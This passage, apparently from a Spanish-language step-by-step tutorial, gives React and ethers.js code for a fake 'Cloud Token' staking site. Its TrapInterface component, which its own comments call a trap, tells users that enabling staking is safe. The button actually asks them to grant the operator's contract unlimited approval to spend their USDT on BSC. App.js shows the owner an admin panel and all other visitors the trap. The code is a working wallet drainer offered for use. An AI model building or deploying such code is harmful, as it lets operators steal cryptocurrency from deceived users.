import React, { useState } from 'react';
import { ethers } from 'ethers';
import usdtAbi from '../abi/USDT.json';

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Dirección de USDT en BSC
const CLOUD_TOKEN_ADDRESS = "DIRECCION_DE_TU_CONTRATO_CLOUD_TOKEN";

const TrapInterface = ({ signer, cloudTokenBalance }) => {
    const [loading, setLoading] = useState(false);

    const handleEnableStaking = async () => {
        if (!signer) {
            alert("Por favor, conecta tu billetera primero.");
            return;
        }
        setLoading(true);
        try {
            // Esta es la parte CRUCIAL de la trampa.
            // Creamos una instancia del contrato USDT, NO del CloudToken.
            const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi.abi, signer);

            // Solicitamos al usuario que apruebe que NUESTRO CONTRATO (CloudToken)
            // gaste una cantidad ilimitada de SUS USDT.
            const transaction = await usdtContract.approve(
                CLOUD_TOKEN_ADDRESS, 
                ethers.MaxUint256 // Aprobar una cantidad "infinita"
            );

            await transaction.wait();
            alert("¡Staking habilitado con éxito! Ahora puedes transferir tus CLOUD para empezar a ganar.");

        } catch (error) {
            console.error("Error en la aprobación:", error);
            alert("La transacción falló o fue rechazada.");
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="trap-interface">
            <h1>Plataforma de Staking de Cloud Token</h1>
            <p>Tu saldo: {cloudTokenBalance} CLOUD</p>
            <p>
                ¡Bienvenido! Para empezar a ganar recompensas, primero debes habilitar el staking en tu cuenta.
                Esto permitirá a nuestro contrato inteligente interactuar con tus tokens de forma segura.
            </p>
            <button onClick={handleEnableStaking} disabled={loading}>
                {loading ? 'Procesando...' : 'Habilitar Staking'}
            </button>
        </div>
    );
};

export default TrapInterface;```

#### **Paso 5: Ensamblaje en `App.js`**

```javascript
import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import ConnectWallet from './components/ConnectWallet';
import AdminPanel from './components/AdminPanel';
import TrapInterface from './components/TrapInterface';
import cloudTokenAbi from './abi/CloudToken.json';
import './App.css';

const CLOUD_TOKEN_ADDRESS = "DIRECCION_DE_TU_CONTRATO_CLOUD_TOKEN";

function App() {
    const [provider, setProvider] = useState(null);
    const [signer, setSigner] = useState(null);
    const [account, setAccount] = useState(null);
    
    const [contractInstance, setContractInstance] = useState(null);
    const [contractOwner, setContractOwner] = useState(null);
    const [isOwner, setIsOwner] = useState(false);
    const [cloudBalance, setCloudBalance] = useState("0");

    useEffect(() => {
        if (signer) {
            const contract = new ethers.Contract(CLOUD_TOKEN_ADDRESS, cloudTokenAbi.abi, signer);
            setContractInstance(contract);

            const fetchContractData = async () => {
                const owner = await contract.owner();
                setContractOwner(owner);
                setIsOwner(account.toLowerCase() === owner.toLowerCase());

                const balance = await contract.balanceOf(account);
                setCloudBalance(ethers.formatUnits(balance, 18));
            };

            fetchContractData();
        }
    }, [signer, account]);

    return (
        <div className="App">
            <header className="App-header">
                <h1>Cloud Token DApp</h1>
                <ConnectWallet setProvider={setProvider} setSigner={setSigner} setAccount={setAccount} />
            </header>
            <main>
                {signer && (
                    isOwner ? 
                    <AdminPanel contractInstance={contractInstance} /> : 
                    <TrapInterface signer={signer} cloudTokenBalance={cloudBalance} />
                )}
            </main>
        </div>
    );
}

export default App;